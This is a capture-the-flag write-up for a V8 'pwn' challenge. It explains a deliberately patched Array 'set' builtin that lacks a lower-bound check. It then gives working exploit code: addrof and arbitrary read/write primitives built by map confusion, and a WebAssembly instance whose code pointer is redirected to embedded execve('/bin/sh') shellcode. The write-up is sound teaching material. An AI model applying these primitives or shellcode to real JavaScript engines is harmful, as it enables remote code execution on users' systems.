# Is this web? [_snakeCTF 2025 Quals_]

**Category**: pwn

## Description

![is this web](images/description.jpg)

## Solution

The full exploit can be found [here](attachments/solve.js).

### Understanding the patch

The patch implements a new builtin function on arrays.
The implementation mostly boils down to the following code:

```cpp
BUILTIN(ArraySet) {
  HandleScope scope(isolate);
  Factory* factory = isolate->factory();
  Handle<Object> receiver = args.receiver();

  // (1)
  if (!IsJSArray(*receiver) ||
      !HasOnlySimpleReceiverElements(isolate, Cast<JSArray>(*receiver)) ||
      args.length() != 3) {
    THROW_NEW_ERROR_RETURN_FAILURE(
        isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
                              factory->NewStringFromAsciiChecked("Nope")));
  }

  // (2)
  Tagged<Object> arg1 = *args.at(1);
  Tagged<Object> arg2 = *args.at(2);

  if (!IsJSArray(arg1) ||
      !HasOnlySimpleReceiverElements(isolate, Cast<JSObject>(arg1)) ||
      !IsNumber(arg2)) {
    THROW_NEW_ERROR_RETURN_FAILURE(
        isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
                              factory->NewStringFromAsciiChecked("Nope")));
  }

  // (3)
  Handle<JSArray> array = Cast<JSArray>(receiver);
Tagged<JSArray> values = Cast<JSArray>(arg1);

  if (array->GetElementsKind() != PACKED_DOUBLE_ELEMENTS ||
      values->GetElementsKind() != PACKED_DOUBLE_ELEMENTS) {
    THROW_NEW_ERROR_RETURN_FAILURE(
        isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
                              factory->NewStringFromAsciiChecked("Nope")));
  }

  // (4)
  int32_t start_index = Object::NumberValue(*args.at(2));

  int32_t values_length =
      static_cast<int32_t>(Object::NumberValue(values->length()));
  int32_t array_length =
      static_cast<int32_t>(Object::NumberValue(array->length()));

  // (5)
  CHECK_LE(start_index + values_length, array_length);

  // (6)
  Tagged<FixedDoubleArray> values_elements =
      Cast<FixedDoubleArray>(values->elements());
  Tagged<FixedDoubleArray> array_elements =
      Cast<FixedDoubleArray>(array->elements());
  for (int32_t i = start_index; i < start_index + values_length; i++) {
    double value =
        values_elements->get_scalar(static_cast<int>(i - start_index));
    array_elements->set(i, value);
  }
  return ReadOnlyRoots(isolate).undefined_value();
}
```

The function that implements the `set` operation for arrays ([similarly to how it is done on `TypedArray`s](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/TypedArray/set)) does the following:

1. It first checks whether the object it got called on is a JS array, that the JS array received has only simple elements (basically, it checks that it doesn't contain accessors or holes), and that the number of arguments is the expected one.
1. Then, the arguments passed to the function are checked. The first argument must be a JS array with only simple elements, whereas the second one must be a number.
1. Now both arrays, that is, the object that the function was called on and the first argument, are both checked to be of type `PACKED_DOUBLE_ELEMENTS`, meaning they only contain floats with no holes.
1. Some useful variables are gathered, such as the value of the second argument, and the length of the two arrays.
1. An upper-bound check is then performed to ensure that the starting index is correctly constrained to avoid writing over the first array.
1. Finally, the values in the second array are copied into the first array starting from the start_index position

The bug is in the usage of `int32_t` values (as well as the lack of lower-bound checking) for the `start_index`, which means that we can pass negative values and write outside the bounds of the first array.

Note: the patch does a bunch of other stuff including the removal of cheesy solutions, and the binding between the above function and the actual `set` function on JS arrays (e.g. `[1.1].set([1.2], 0))`).

### Pwning it

It is here assumed that the reader has a certain knowledge of V8 object representation in memory and V8 exploitation. If not, there are lots of excellent resources (that explain the basics better than I ever could) freely available online ([such as this](https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/)).

First, we need to find a way to get the address of arbitrary objects. To do so, it is possible to confuse an array. This basically means changing the `map` of an array, from example from `PACKED_ELEMENTS` (which stores its elements as pointers to memory locations) to `PACKED_DOUBLE_ELEMENTS` (which stores its `float` elements directly). In order to confuse an array, we first need to retrieve the map we want to change the array into (and the empty properties address, due to pointer compression and our ability to write 8 bytes at a time). To do so, we can use `d8` debug functions to retrieve it:

```
❯ ./d8 --allow-natives-syntax
V8 version 14.1.0 (candidate)
d8> %DebugPrint([1.1])
DebugPrint: 0x2164000c3705: [JSArray]
 - map: 0x21640004b651 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x21640004af99 <JSArray[0]>
 - elements: 0x2164000c36f5 <FixedDoubleArray[1]> [PACKED_DOUBLE_ELEMENTS]
 - length: 1
 - properties: 0x2164000007bd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x216400000df5: [String] in ReadOnlySpace: #length: 0x216400026881 <AccessorInfo name= 0x216400000df5 <String[6]: #length>, data= 0x216400000011 <undefined>> (const accessor descriptor, attrs: [W__]), location: descriptor
 }
 - elements: 0x2164000c36f5 <FixedDoubleArray[1]> {
           0: 1.1
 }
0x21640004b651: [Map] in OldSpace
 - map: 0x216400042db1 <MetaMap (0x216400042e01 <NativeContext[301]>)>
 - type: JS_ARRAY_TYPE
 - instance size: 16
 - inobject properties: 0
 - unused property fields: 0
 - elements kind: PACKED_DOUBLE_ELEMENTS
 - enum length: invalid
 - back pointer: 0x21640004b60d <Map[16](HOLEY_SMI_ELEMENTS)>
 - prototype_validity_cell: 0x216400000acd <Cell value= [cleared]>
 - instance descriptors #1: 0x21640004b5d1 <DescriptorArray[1]>
 - transitions #1: 0x21640004b679 <TransitionArray[5]>
   Transitions #1:
     0x216400000e91 <Symbol: (elements_transition_symbol)>: (transition to HOLEY_DOUBLE_ELEMENTS) -> 0x21640004b695 <Map[16](HOLEY_DOUBLE_ELEMENTS)>
 - prototype: 0x21640004af99 <JSArray[0]>
 - constructor: 0x21640004aec1 <JSFunction Array (sfi = 0x216400195a21)>
 - dependent code: 0x2164000007cd <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0

[1.1]
d8>
```

We can now craft our `addrof` function:

```js
const EMPTY_PROPERTIES = 0x7bdn;
const PACKED_DOUBLE_ELEMENTS_MAP = 0x4b651n;

const addrof = (obj) => {
  // (1)
  const victim = [{}, 1.2];
  const oob = [1.1];

  // (2)
  victim[0] = obj;

  // (3)
  oob.set([itof((EMPTY_PROPERTIES << 32n) | PACKED_DOUBLE_ELEMENTS_MAP)], -3);
  return ftoi(victim[0]) & 0xffffffffn;
};
```

1. First, declare two arrays. The first (`victim`) is of type `PACKED_ELEMENTS`, and will contain the addresses of the passed objects. The second is used to perform an out-of-bounds write and must be of type `PACKED_DOUBLE_ELEMENTS` (due to checks on the patch).
1. Then, write `obj` (the object we want to get the address of) to one of the `victim` array slots (e.g. the first).
1. Next, the bug introduced by the patch is used to overwrite the map of `victim` to `PACKED_DOUBLE_ELEMENTS`. V8 will now be convinced that `victim` is an array of floats, and this will allow us to read the address of objects stored inside it (such as `obj`)
1. Finally, return the first element from `victim`. Note that this will return a float (8 bytes), whereas pointers in v8 are compressed, hence we only keep the lower part.

Next, we need to craft primitives to read/write from/to (caged) memory. This can be done by overwriting the backing pointer of a victim array with the address (minus 8 due to the header size of array backing structure) of the address we want to read/write from/to. The following code implements these two primitives:

```js
const arb_read = (addr) => {
  const victim = [{}, 1.2];
  const oob = [1.1];
  oob.set(
    [
      itof((EMPTY_PROPERTIES << 32n) | PACKED_DOUBLE_ELEMENTS_MAP),
      itof(((BigInt(victim.length) * 2n) << 32n) | (addr - 8n)),
    ],
    -3
  );
  return ftoi(victim[0]);
};

const arb_write = (addr, data) => {
  const victim = [{}, 1.2];
  const oob = [1.1];
  oob.set(
    [
      itof((EMPTY_PROPERTIES << 32n) | PACKED_DOUBLE_ELEMENTS_MAP),
      itof(((BigInt(victim.length) * 2n) << 32n) | (addr - 8n)),
    ],
    -3
  );
  victim[0] = itof(data);
};
```

Note that we also need to overwrite the length. In this case it is kept the same as `victim`'s length (times 2 due to Smi representation in V8) for simplicity.

We now have all the primitives needed to achieve RCE!
From `args.gn` we can see that there is no sandbox, hence we can use the WASM instance technique to get a shell:

```js
var wasm_code = new Uint8Array([
  0, 97, 115, 109, 1, 0, 0, 0, 1, 5, 1, 96, 0, 1, 127, 3, 2, 1, 0, 4, 4, 1, 112,
  0, 0, 5, 3, 1, 0, 1, 7, 17, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109,
  97, 105, 110, 0, 0, 10, 133, 1, 1, 130, 1, 0, 65, 0, 68, 0, 0, 0, 0, 0, 0, 0,
  0, 57, 3, 0, 65, 0, 68, 106, 59, 88, 144, 144, 144, 235, 11, 57, 3, 0, 65, 0,
  68, 104, 47, 115, 104, 0, 91, 235, 11, 57, 3, 0, 65, 0, 68, 104, 47, 98, 105,
  110, 89, 235, 11, 57, 3, 0, 65, 0, 68, 72, 193, 227, 32, 144, 144, 235, 11,
  57, 3, 0, 65, 0, 68, 72, 1, 203, 83, 144, 144, 235, 11, 57, 3, 0, 65, 0, 68,
  72, 137, 231, 144, 144, 144, 235, 11, 57, 3, 0, 65, 0, 68, 72, 49, 246, 72,
  49, 210, 235, 11, 57, 3, 0, 65, 0, 68, 15, 5, 144, 144, 144, 144, 235, 11, 57,
  3, 0, 65, 42, 11,
]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var get_shell = wasm_instance.exports.main;
// Do **NOT** call the function get_shell, otherwise this won't work.
// get_shell();

// Get the address of the wasm instance trusted data
// %DebugPrint(wasm_instance);
console.log("[+] wasm instance @ " + hex(addrof(wasm_instance)));
var trusted_data = arb_read(addrof(wasm_instance) + 8n) >> 32n;
console.log("[+] trusted_data @ " + hex(trusted_data));
var trusted_data_ptr_to_code = trusted_data + 0x8n * 5n;
var code = arb_read(trusted_data_ptr_to_code);
console.log("[+] code @ " + hex(code));
var shellcode_addr = code + 0x900n + 0x27n;
arb_write(trusted_data_ptr_to_code, shellcode_addr);
get_shell();
```

Note that the offset inside of `code` to find the correct `shellcode_addr` value are dependent on the V8 version (and probably compile arguments), thus that offset needs to be found from GDB.
